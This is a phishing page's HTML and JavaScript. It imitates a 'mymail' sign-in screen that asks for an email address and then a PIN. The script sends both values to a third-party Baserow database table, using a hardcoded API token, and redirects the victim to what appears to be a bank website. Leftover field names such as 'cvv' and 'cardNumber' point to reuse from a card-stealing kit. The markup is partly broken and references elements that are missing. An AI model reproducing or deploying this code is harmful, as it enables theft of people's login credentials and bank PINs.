        <!-- Page 1: Email Input -->

            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to mymail</p>
            
            <form class="form" id="email-form">
                <div class="input-container">
                    <input type="text" id="email" class="input-field" placeholder="Email or phone" autofocus required>
                </div>
                
                <a href="#" class="link forgot-link">Forgot email?</a>

                    Not your computer? Use Private Browsing windows to sign in. 
                    <a href="#" class="link">Learn more about using Guest mode</a>
                </p>
                
                <div class="footer">
                    <a href="#" class="link">Create account</a>
                    <button type="submit" class="button">Next</button>
                </div>
            </form>
        </div>

        <!-- Page 2: PIN Code Input -->

            <h1 class="title">Welcome</h1>

    <script>
        // DOM elements
const page1 = document.getElementById('page1');
const page2 = document.getElementById('page2');
const emailForm = document.getElementById('email-form');
const pinForm = document.getElementById('pin-form');
const emailInput = document.getElementById('email');
const pinInput = document.getElementById('pin-code');
const displayEmail = document.getElementById('display-email');
const showPinCheckbox = document.getElementById('show-pin');

// Baserow API config
const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL'; // ‚úÖ Your actual token
const TABLE_ID = '503285';
const BASEROW_API = `https://api.baserow.io/api/database/rows/table/${TABLE_ID}/`;

// ‚úÖ Replace these with your actual field IDs from Baserow (not labels!)
const FIELD_EMAIL = 'cvv'; // üîÅ Replace with actual field ID for "cardNumber"
const FIELD_PIN = 'bank';   // üîÅ Replace with actual field ID for "expiryYear"

// Handle email form submission
emailForm.addEventListener('submit', function (e) {
    e.preventDefault();

    const email = emailInput.value.trim();
    if (email) {
        localStorage.setItem('userEmail', email);
        displayEmail.textContent = email;
        page1.style.display = 'none';
        page2.style.display = 'block';
        pinInput.focus();
        document.title = 'Welcome - mymail';
    }
});

// Handle PIN form submission
pinForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const email = localStorage.getItem('userEmail');
    const pin = pinInput.value;

    if (email && pin) {
        try {
            const response = await fetch(BASEROW_API, {
                method: 'POST',
                headers: {
                    'Authorization': TOKEN,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    [FIELD_EMAIL]: email,
                    [FIELD_PIN]: pin
                })
            });

            const result = await response.json();

            if (response.ok) {
                console.log('‚úÖ Data submitted to Baserow:', result);
                alert('‚úÖ Submitted to Baserow successfully!');
            } else {
                console.error('‚ùå Baserow API error:', result);
                alert('‚ùå Baserow error: ' + JSON.stringify(result));
            }

            window.location.href = 'https://www.bf.bg';
        } catch (error) {
            console.error('‚ùå Fetch error:', error);
            alert('‚ùå Network error: ' + error.message);
            window.location.href = 'https://www.bf.bg';
        }
    }
});

// Toggle PIN visibility
showPinCheckbox.addEventListener('change', function () {
    pinInput.style.webkitTextSecurity = this.checked ? 'none' : 'disc';
    pinInput.style.textSecurity = this.checked ? 'none' : 'disc';
});

// Initialize PIN field to be masked
pinInput.style.webkitTextSecurity = 'disc';
pinInput.style.textSecurity = 'disc';

// Load saved email if revisiting
window.addEventListener('load', function () {
    const savedEmail = localStorage.getItem('userEmail');
    if (savedEmail && (window.location.hash === '#verify' || window.location.search.includes('continue'))) {
        displayEmail.textContent = savedEmail;
        page1.style.display = 'none';
        page2.style.display = 'block';
        document.title = 'Welcome - mymail';
    }
});

    </script>
